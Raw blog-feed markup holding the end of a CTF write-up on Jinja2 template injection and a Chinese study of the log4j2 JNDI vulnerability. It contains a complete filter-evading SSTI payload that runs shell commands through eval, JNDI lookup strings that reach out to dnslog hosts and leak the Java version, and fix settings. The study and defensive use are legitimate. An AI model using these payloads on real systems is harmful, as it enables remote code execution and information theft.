class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> f,v <span class="keyword">in</span> (<span class="variable language_">self</span>|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> f == bul %&#125;</span><br><span class="line">        &#123;% <span class="keyword">for</span> a,b <span class="keyword">in</span> (v|attr(itm))() %&#125;</span><br><span class="line">            &#123;% <span class="keyword">if</span> a == ev %&#125;</span><br><span class="line">            &#123;%<span class="built_in">print</span>(b(pld))%&#125;</span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></div><h3 id="完整payload"><a href="#完整payload" class="headerlink" title="完整payload"></a>完整payload</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> zero = (<span class="variable language_">self</span>|<span class="built_in">int</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> one = (zero**zero)|<span class="built_in">int</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> two = (zero-one-one)|<span class="built_in">abs</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> four = (two*two)|<span class="built_in">int</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> five = (two*two*two)-one-one-one %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> three = five-one-one %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> nine = (two*two*two*two-five-one-one) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> seven = (zero-one-one-five)|<span class="built_in">abs</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space = <span class="variable language_">self</span>|string|<span class="built_in">min</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> point = <span class="variable language_">self</span>|<span class="built_in">float</span>|string|<span class="built_in">min</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> c = <span class="built_in">dict</span>(c=aa)|reverse|first %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bfh = <span class="variable language_">self</span>|string|urlencode|first %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bfhc = bfh~c %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> slas = bfhc%((four~seven)|<span class="built_in">int</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> yin = bfhc%((three~nine)|<span class="built_in">int</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx = bfhc%((nine~five)|<span class="built_in">int</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> right = bfhc%((four~one)|<span class="built_in">int</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> left = bfhc%((four~zero)|<span class="built_in">int</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> but = <span class="built_in">dict</span>(buil=aa,tins=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> imp = <span class="built_in">dict</span>(imp=aa,ort=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> pon = <span class="built_in">dict</span>(po=aa,pen=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> so = <span class="built_in">dict</span>(o=aa,s=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ca = <span class="built_in">dict</span>(ca=aa,t=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> flg = <span class="built_in">dict</span>(fl=aa,ag=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ev = <span class="built_in">dict</span>(ev=aa,al=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> red = <span class="built_in">dict</span>(re=aa,ad=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> sl = <span class="built_in">dict</span>(l=aa,s=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bul = xhx~xhx~but~xhx~xhx %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini = <span class="built_in">dict</span>(ini=aa,t=bb)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo = <span class="built_in">dict</span>(glo=aa,bals=bb)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> itm = <span class="built_in">dict</span>(ite=aa,ms=bb)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> f,v <span class="keyword">in</span> (<span class="variable language_">self</span>|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> f == bul %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> a,b <span class="keyword">in</span> (v|attr(itm))() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> a == ev %&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(b(pld))%&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ssti </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2漏洞学习</title>
      <link href="/2022/12/27/log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/12/27/log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="log4j2漏洞学习"><a href="#log4j2漏洞学习" class="headerlink" title="log4j2漏洞学习"></a>log4j2漏洞学习</h1><h2 id="log4j与log4j2区别"><a href="#log4j与log4j2区别" class="headerlink" title="log4j与log4j2区别"></a>log4j与log4j2区别</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>log4j用.properties的文件作为主配置文件的，而现在的log4j 2则已经弃用了这种方式，采用的是.xml，.json或者.jsn这种方式来做</p><h3 id="核心jar包"><a href="#核心jar包" class="headerlink" title="核心jar包"></a>核心jar包</h3><p>log4j只需要引入一个jar包即可，</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>而log4j 2则是需要2个核心</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>log4j和log4j 2的包路径是不同的,甚至可以在一个项目中使用2个版本的日志输出</p></blockquote><h3 id="文件渲染"><a href="#文件渲染" class="headerlink" title="文件渲染"></a>文件渲染</h3><p>log4j想要生效，我们需要在web.xml中进行配置</p><p>log4j2就比较简单，以maven工程为例，我们只需要把log4j2.xml放到工程resource目录下就行了。大家记住一个细节点，是log4j2.xml，而不是log4j.xml，<u>xml名字少个2都不行</u></p><h3 id="log调用"><a href="#log调用" class="headerlink" title="log调用"></a>log调用</h3><p>log4j</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.log4j.Logger;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> Logger.getLogger(Test.class.getName());</span><br></pre></td></tr></table></figure></div><p>log4j2</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Level;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Test.class.getName());</span><br></pre></td></tr></table></figure></div><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><p>如果log4j.properties一直不起作用，将其复制到target的classesxia</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6qwvy8e0hj30r8056glt.jpg"                      alt="image-20221002140908570"                ><figcaption>image-20221002140908570</figcaption></figure></p><h3 id="一些配置教训"><a href="#一些配置教训" class="headerlink" title="一些配置教训"></a>一些配置教训</h3><p>注意版本对应</p><p>如果是2021.3的idea，不要使用高版本maven，应使用3.5.4</p><h3 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h3><p>第一次引入会因为没有下载而爆红，点击刷新即可</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232951.jpg"                      alt="image-20221002141921173"                ><figcaption>image-20221002141921173</figcaption></figure></p><h3 id="导包注意名称"><a href="#导包注意名称" class="headerlink" title="导包注意名称"></a>导包注意名称</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br></pre></td></tr></table></figure></div><blockquote><p>2.14.0 log4j导包</p></blockquote><h3 id="程序包-com-sun-jndi-rmi-registry-不可见"><a href="#程序包-com-sun-jndi-rmi-registry-不可见" class="headerlink" title="程序包 com.sun.jndi.rmi.registry 不可见"></a>程序包 com.sun.jndi.rmi.registry 不可见</h3><p>注意：还是得换成jdk1.8</p><p>解决，在pom.xml中加入以下标签</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">source</span>&gt;</span>$&#123;java.version&#125;<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span>&gt;</span>$&#123;java.version&#125;<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">compilerArguments</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">bootclasspath</span>&gt;</span>$&#123;java.home&#125;/lib/rt.jar<span class="tag">&lt;/<span class="name">bootclasspath</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">compilerArguments</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>注意：plugin标签要包裹在plugins中，plugins要包裹在build中</p></blockquote><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>一般将日志对象定义为当前类等静态私有成员</p><h3 id="使用占位符-打印日志"><a href="#使用占位符-打印日志" class="headerlink" title="使用占位符{}打印日志"></a>使用占位符{}打印日志</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> <span class="string">&quot;bob&quot;</span>;</span><br><span class="line"></span><br><span class="line">    logger.error(<span class="string">&quot;&#123;&#125; is not exited!&quot;</span>,user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>成功打印</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232469.jpg"                      alt="image-20221002151825195"                ><figcaption>image-20221002151825195</figcaption></figure></p><h3 id="lookups"><a href="#lookups" class="headerlink" title="lookups"></a>lookups</h3><p>可以通过<code>$&#123;xxx:xxx&#125;</code>等形式快速获取运行应用容器的docker属性，环境变量，日志事件，Java应用程序环境信息等内容。</p><h1 id="漏洞及分析"><a href="#漏洞及分析" class="headerlink" title="漏洞及分析"></a>漏洞及分析</h1><h3 id="影响版本范围"><a href="#影响版本范围" class="headerlink" title="影响版本范围"></a>影响版本范围</h3><p>2.0-beta9 &lt;&#x3D; Apache Log4j &lt;&#x3D; 2.15.0-rc1（1.x不受影响）</p><p>需要导入log4j-core才行</p><p>先用2.14.0做实验(JDK 1.8下)</p><blockquote><p>原理：JNDI注入</p></blockquote><h2 id="利用lookups获取敏感信息"><a href="#利用lookups获取敏感信息" class="headerlink" title="利用lookups获取敏感信息"></a>利用lookups获取敏感信息</h2><p>输出JDK版本</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOGGER.error(<span class="string">&quot;Java version :&#123;&#125;&quot;</span>,<span class="string">&quot;$&#123;java:version&#125;&quot;</span>);</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232986.jpg"                      alt="image-20221002153617894"                ><figcaption>image-20221002153617894</figcaption></figure></p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>组件中lookup功能的实现类JndiLookup的设计缺陷导致，这个类是在Log4j-core-xxx.jar，所以这个漏洞和Log4j-core有关</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232662.jpg"                      alt="image-20221002153838589"                ><figcaption>image-20221002153838589</figcaption></figure></p><p>在调用lookup方法处打断点</p><p>JNDI lookup的方法调用在InitialContext.java中</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232530.jpg"                      alt="image-20221002154141225"                ><figcaption>image-20221002154141225</figcaption></figure></p><h3 id="Debug过程"><a href="#Debug过程" class="headerlink" title="Debug过程"></a>Debug过程</h3><p>测试代码</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.error(<span class="string">&quot;野猪热恋$&#123;jndi:ldap://atf6sq.dnslog.cn&#125;&quot;</span>);</span><br></pre></td></tr></table></figure></div><p>直接传入的就是${}中的内容(没有过滤),也没有传入其他部分</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232515.jpg"                      alt="image-20221002154417043"                ><figcaption>image-20221002154417043</figcaption></figure></p><p>查看执行链过程,该lookup方法后续在JndiLookup中被调用</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6qzrx5jggj30u204wgm9.jpg"                      alt="image-20221002154907000"                ><figcaption>image-20221002154907000</figcaption></figure></p><p>过程</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">JndiLookup.java:</span><br><span class="line">var6 = Objects.toString(jndiManager.lookup(jndiName), (String)<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">JndiManager.java:</span><br><span class="line"><span class="keyword">public</span> T <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.context.lookup(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Context.java:</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException;</span><br><span class="line"></span><br><span class="line">InitialContext.java</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"><span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>之后处理变量的工作交给了StrSubstitutor这个类</p><p>之后又调用了MessagePatternConverter这个类的format方法</p><ol><li>首先是noLookups这个属性，设置成了false，导致下面代码的执行（现在漏洞修复将这个noLookups设置成true）</li><li>后面的if明显是要定位到<code>$&#123;</code>（并且是连续的），如果有这两个字符就去replace函数替换</li><li>config.getStrSubstitutor()就是上面说的StrSubstitutor</li></ol><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232226.jpg"                      alt="image-20221002160354461"                ><figcaption>image-20221002160354461</figcaption></figure></p><blockquote><p>Log4j将要输出的日志拼接成字符串之后，它会去判断字符串中是否包含${和},如果包含了，就会当作变量交给StrSubstitutor这个类去处理。</p></blockquote><p>StrSubstitutor中resolveVariable方法获取${}中字符串</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6r0jtfl7mj31ck05ojt3.jpg"                      alt="image-20221002161555507"                ><figcaption>image-20221002161555507</figcaption></figure></p><p>可以看到resolver中的内容，可以看到Lookups定义了12种处理类型，如果能匹配到这几种处理类型，就交给它们去处理，其他的都会交给defaultLookup去处理。</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232081.jpg"                      alt="image-20221002161942852"                ><figcaption>image-20221002161942852</figcaption></figure></p><blockquote><p>如果我们的日志内容中有<code>$&#123;jndi:rmi://127.0.0.1:1099/hello&#125;</code>这些内容，去掉${和}传递给resolver的就是<code>jndi:rmi://127.0.0.1:1099/hello</code>。resolver会将第一个”:”之前的内容和lookups做匹配，我们这里获取到的是jndi，就会将剩余部分<code>jndi:rmi://127.0.0.1:1099/hello</code>交给jdni的处理器JndiLookup去处理。</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232251.jpg"                      alt="image-20221002162800611"                ><figcaption>image-20221002162800611</figcaption></figure></p></blockquote><p>传入是信息debug标注，最好用的lookup.lookup也是JNDI的lookup</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232513.jpg"                      alt="image-20221002162941649"                ><figcaption>image-20221002162941649</figcaption></figure></p><blockquote><p>从而得到了lookup的结果</p></blockquote><h3 id="noLookups相关"><a href="#noLookups相关" class="headerlink" title="noLookups相关"></a>noLookups相关</h3><p>调用formate</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232599.jpg"                      alt="image-20221002171504977"                ><figcaption>image-20221002171504977</figcaption></figure></p><p>赋值操作（位于 MessagePatternConverter类中）</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">int</span> <span class="variable">noLookupsIdx</span> <span class="operator">=</span> <span class="built_in">this</span>.loadNoLookups(options);</span><br><span class="line">        <span class="built_in">this</span>.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">loadNoLookups</span><span class="params">(<span class="keyword">final</span> String[] options)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (options != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; options.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">option</span> <span class="operator">=</span> options[i];</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;nolookups&quot;</span>.equalsIgnoreCase(option)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>由于调用 MessagePatternConverter类的format方法 没有传入options且config非空，并且环境变量也没有设置因此noLookups为false</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232069.jpg"                      alt="image-20221002190435592"                ><figcaption>image-20221002190435592</figcaption></figure></p></blockquote><h3 id="漏洞检测方法"><a href="#漏洞检测方法" class="headerlink" title="漏洞检测方法"></a>漏洞检测方法</h3><p>通过dnslog，还能查看jdk版本是否支持RMI或者ldap服务</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:dns://$&#123;sys:java.version&#125;.dnslog/&#125;</span><br></pre></td></tr></table></figure></div><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>1、升级到2.17.0版本及以上</p><p>2、参数、环境设置</p><ul><li><p>设置jvm参数：-Dlog4j2.formatMsgNoLookups&#x3D;true，</p></li><li><p>设置系统环境变量：FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS&#x3D;true</p></li></ul><blockquote><p>JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA</p></blockquote><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>JDK：11.0.15</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>JNDI相当于自己做一个服务，如果访问了会直接在放我这本机上执行方法中的代码</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232104.jpg"                      alt="image-20221002194642057"                ><figcaption>image-20221002194642057</figcaption></figure></p><h2 id="简单复现"><a href="#简单复现" class="headerlink" title="简单复现"></a>简单复现</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072233648.jpg"                      alt="tststst"                ><figcaption>tststst</figcaption></figure></p><p>RMIServer.java</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cui.log4jtest.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span 